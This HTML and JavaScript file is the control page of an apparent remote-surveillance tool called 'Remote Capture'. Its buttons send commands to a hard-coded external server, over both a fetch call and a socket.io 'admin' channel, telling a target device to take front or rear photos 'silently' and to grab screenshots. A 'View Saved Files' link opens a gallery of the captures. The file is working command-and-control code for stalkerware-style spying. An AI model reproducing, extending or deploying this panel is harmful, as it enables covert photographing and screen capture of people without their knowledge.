<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Snapshot Menu</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* --- THEME VARIABLES --- */
        :root {
            /* DEFAULT PINK THEME */
            --bg-color: #fdf4ff;
            --bg-gradient: linear-gradient(180deg, #fdf4ff 0%, #eef5ff 100%);
            --glass-bg: #ffffff;
            --glass-border: rgba(209, 82, 204, 0.2);
            --text-main: #333333;
            --text-sub: #888888;
            --accent: #d152cc;
            --icon-bg: rgba(209, 82, 204, 0.1);
            --btn-gradient: linear-gradient(135deg, #fbc2eb 0%, #a6c1ee 100%);
            --btn-text: #ffffff;
            --btn-shadow: rgba(234, 164, 230, 0.4);
            --list-shadow: 0 4px 15px rgba(0,0,0,0.04);
        }

        body.dark-mode {
            /* DARK THEME (On Click) */
            --bg-color: #0f0f0f;
            --bg-gradient: linear-gradient(45deg, #000000, #1a1a1a);
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.15);
            --text-main: #ffffff;
            --text-sub: #aaaaaa;
            --accent: #00f3ff;
            --icon-bg: rgba(255, 255, 255, 0.05);
            --btn-gradient: linear-gradient(90deg, #00f3ff, #00bcd4);
            --btn-text: #000000;
            --btn-shadow: rgba(0, 243, 255, 0.3);
            --list-shadow: none;
        }

        /* --- GLOBAL STYLES --- */
        * { box-sizing: border-box; }
        body {
            background-color: var(--bg-color);
            background-image: var(--bg-gradient);
            color: var(--text-main);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 20px;
            min-height: 100vh;
            transition: background 0.4s ease, color 0.4s ease;
        }

        /* --- HEADER --- */
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 30px; }
        .icon-btn {
            background: var(--glass-bg); border: 1px solid var(--glass-border);
            color: var(--accent); padding: 10px 15px; border-radius: 12px;
            cursor: pointer; text-decoration: none; font-size: 1.1rem;
            display: flex; align-items: center; justify-content: center;
            box-shadow: var(--list-shadow); transition: 0.3s;
        }
        .icon-btn:active { transform: scale(0.95); }
        .page-title { 
            font-size: 1.2rem; font-weight: 700; 
            color: var(--accent); text-transform: uppercase; letter-spacing: 1px; 
        }

        /* --- CONTAINER --- */
        .container { width: 100%; max-width: 400px; margin: 0 auto; }

        /* --- LIST ITEMS --- */
        .list-group { margin-bottom: 25px; }
        .list-title { 
            color: var(--text-sub); font-size: 0.8rem; margin-bottom: 10px; 
            font-weight: bold; text-transform: uppercase; letter-spacing: 1px;
            padding-left: 5px;
        }
        
        .list-item {
            display: flex; align-items: center; gap: 15px;
            background: var(--glass-bg);
            padding: 16px; border-radius: 15px; margin-bottom: 12px;
            cursor: pointer; transition: 0.2s;
            border: 1px solid var(--glass-border);
            box-shadow: var(--list-shadow);
        }
        .list-item:active { transform: scale(0.98); border-color: var(--accent); }
        
        .icon-box {
            width: 42px; height: 42px;
            background: var(--icon-bg);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-size: 1.2rem; color: var(--accent);
        }
        
        .text-content { display: flex; flex-direction: column; flex: 1; }
        .main-text { font-size: 1rem; color: var(--text-main); font-weight: 600; }
        .sub-text { font-size: 0.75rem; color: var(--text-sub); margin-top: 3px; }
        
        /* Spinner */
        .spinner {
            border: 2px solid rgba(150, 150, 150, 0.2);
            border-top: 2px solid var(--accent);
            border-radius: 50%; width: 18px; height: 18px;
            animation: spin 0.8s linear infinite;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* --- BUTTON --- */
        .gallery-btn {
            width: 100%; padding: 15px; border-radius: 15px;
            background: var(--btn-gradient);
            color: var(--btn-text); font-weight: bold; border: none; font-size: 1rem;
            cursor: pointer; margin-top: 20px; box-shadow: 0 6px 20px var(--btn-shadow);
            transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px;
        }
        .gallery-btn:active { transform: scale(0.96); }

    </style>
</head>
<body>

    <div class="header">
        <a href="javascript:history.back()" class="icon-btn"><i class="fa-solid fa-arrow-left"></i></a>
        <div class="page-title">Remote Capture</div>
        <button class="icon-btn" onclick="toggleTheme()" id="themeBtn">
            <i class="fa-solid fa-moon"></i>
        </button> 
    </div>

    <div class="container">
        
        <div class="list-group">
            <div class="list-title">Camera Controls</div>
            
            <div class="list-item" onclick="triggerCommand(this, 'camera_front')">
                <div class="icon-box"><i class="fa-solid fa-user"></i></div>
                <div class="text-content">
                    <div class="main-text">Front Camera</div>
                    <div class="sub-text">Take a selfie silently</div>
                </div>
                <div class="spinner"></div>
                <i class="fa-solid fa-chevron-right arrow-icon" style="color:var(--text-sub); font-size: 0.8rem;"></i>
            </div>

            <div class="list-item" onclick="triggerCommand(this, 'camera')">
                <div class="icon-box"><i class="fa-solid fa-camera"></i></div>
                <div class="text-content">
                    <div class="main-text">Back Camera</div>
                    <div class="sub-text">Capture rear view silently</div>
                </div>
                <div class="spinner"></div>
                <i class="fa-solid fa-chevron-right arrow-icon" style="color:var(--text-sub); font-size: 0.8rem;"></i>
            </div>
        </div>

        <div class="list-group">
            <div class="list-title">Display Controls</div>
            
            <div class="list-item" onclick="triggerCommand(this, 'capture_screen')">
                <div class="icon-box"><i class="fa-solid fa-mobile-screen"></i></div>
                <div class="text-content">
                    <div class="main-text">Screen Shot</div>
                    <div class="sub-text">Capture current screen frame</div>
                </div>
                <div class="spinner"></div>
                <i class="fa-solid fa-chevron-right arrow-icon" style="color:var(--text-sub); font-size: 0.8rem;"></i>
            </div>
        </div>

        <button onclick="goToGallery()" class="gallery-btn">
            <i class="fa-solid fa-images"></i> View Saved Files
        </button>

    </div>

    <script>
        const SERVER_URL = "https://webrtc-screen.onrender.com"; 
        
        // Globals setup
        const urlParams = new URLSearchParams(window.location.search);
        let DEVICE_ID = urlParams.get('id') || localStorage.getItem('monitoring_id');

        if (!DEVICE_ID) {
            alert("⚠️ Device ID Missing! Please select a device first.");
            window.location.href = 'index.html'; 
        }

        // Global reference for socket to prevent initialization errors
        window.liveSocket = null;

        // ===========================================
        // 🔥 TRIGGER COMMAND FUNCTION (INDEPENDENT & BULLETPROOF)
        // ===========================================
        window.triggerCommand = function(element, command) {
            if (!DEVICE_ID) return alert("Device ID Missing!");

            // Toggle UI Elements safely
            const spinner = element.querySelector('.spinner');
            const arrowIcon = element.querySelector('.arrow-icon');
            
            if (spinner) spinner.style.display = "block";
            if (arrowIcon) arrowIcon.style.display = "none";
            
            console.log(`Sending command: ${command} to Device: ${DEVICE_ID}`);

            // METHOD 1: Fetch API Send (Ekdum reliable bina page reload kiye)
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId: DEVICE_ID, command: command })
            })
            .then(res => res.json())
            .then(data => console.log("API pipeline response:", data))
            .catch(err => console.error("API backup endpoint log:", err));

            // METHOD 2: Live Socket Send (Agar socket successfully connected hai toh)
            if (window.liveSocket && window.liveSocket.connected) {
                window.liveSocket.emit('send-command', {
                    targetId: DEVICE_ID,
                    command: command
                });
            }

            // 1.5 Second baad spinner off aur arrow wapas visible (No Reload)
            setTimeout(() => {
                if (spinner) spinner.style.display = "none";
                if (arrowIcon) arrowIcon.style.display = "block";
            }, 1500);
        };

        // ===========================================
        // 🔥 THEME TOGGLE LOGIC
        // ===========================================
        function toggleTheme() {
            const body = document.body;
            const themeBtnIcon = document.querySelector('#themeBtn i');
            
            body.classList.toggle('dark-mode');
            
            if(body.classList.contains('dark-mode')) {
                if(themeBtnIcon) {
                    themeBtnIcon.classList.remove('fa-moon');
                    themeBtnIcon.classList.add('fa-sun');
                }
                localStorage.setItem('theme', 'dark');
            } else {
                if(themeBtnIcon) {
                    themeBtnIcon.classList.remove('fa-sun');
                    themeBtnIcon.classList.add('fa-moon');
                }
                localStorage.setItem('theme', 'light');
            }
        }

        // Initialize Theme smoothly on script run
        if(localStorage.getItem('theme') === 'dark') {
            document.body.classList.add('dark-mode');
            const themeBtnIcon = document.querySelector('#themeBtn i');
            if(themeBtnIcon) {
                themeBtnIcon.classList.remove('fa-moon');
                themeBtnIcon.classList.add('fa-sun');
            }
        }

        function goToGallery() {
            window.location.href = `saved_files.html?id=${DEVICE_ID}`;
        }
    </script>

    <!-- Local – avoids CDN ERR_CONNECTION_TIMED_OUT, faster page load -->
    <script src="socket.io.min.js"></script>
    <script>
        // Socket connection ko try-catch block mein safe kar diya taaki core page crash na ho
        try {
            if (typeof io !== 'undefined') {
                window.liveSocket = io(SERVER_URL, {
                    transports: ['polling', 'websocket'],
                    reconnection: true,
                    timeout: 8000,
                    reconnectionAttempts: 5
                });

                window.liveSocket.on('connect', () => {
                    console.log("✅ Connected to Server via Safe Socket!");
                    window.liveSocket.emit('join-admin', { adminId: 'admin123' });
                });
            }
        } catch (socketError) {
            console.warn("Socket infrastructure loading delayed, falling back completely to API delivery channel.", socketError);
        }
    </script>

</body>
</html>
